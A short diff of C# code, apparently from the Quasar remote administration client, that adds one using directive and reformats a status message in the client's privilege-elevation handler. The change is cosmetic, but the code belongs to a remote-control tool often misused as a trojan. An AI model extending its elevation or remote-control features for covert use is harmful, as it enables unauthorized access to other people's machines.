@@ -6,6 +6,7 @@ using Quasar.Client.Utilities;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Messages.ClientManagement;
+using Quasar.Common.Messages.other;
 using Quasar.Common.Networking;
 using System;
 using System.Diagnostics;
@@ -99,7 +100,7 @@ namespace Quasar.Client.Messages
                 }
                 catch
                 {
-                    client.Send(new SetStatus { Message = "User refused the elevation request." });
+                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                     _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);  // re-grab the mutex
                     return;
                 }
